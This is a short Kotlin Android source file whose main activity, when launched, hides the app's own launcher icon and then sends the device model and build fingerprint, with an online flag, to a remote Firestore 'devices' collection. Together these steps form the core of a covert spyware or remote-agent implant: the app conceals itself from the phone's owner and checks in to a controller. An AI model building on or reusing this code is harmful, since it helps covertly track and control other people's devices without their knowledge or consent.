package com.agent

import android.os.Bundle
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.firestore.FirebaseFirestore
import android.content.ComponentName
import android.content.pm.PackageManager

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Hide Icon
        val pkg = packageManager
        val component = ComponentName(this, MainActivity::class.java)
        pkg.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)

        // Send to Firebase
        val db = FirebaseFirestore.getInstance()
        val data = hashMapOf(
            "model" to Build.MODEL,
            "online" to true,
            "last_seen" to com.google.firebase.firestore.FieldValue.serverTimestamp()
        )
        db.collection("devices").document(Build.FINGERPRINT).set(data)

        finish() 
    }
}
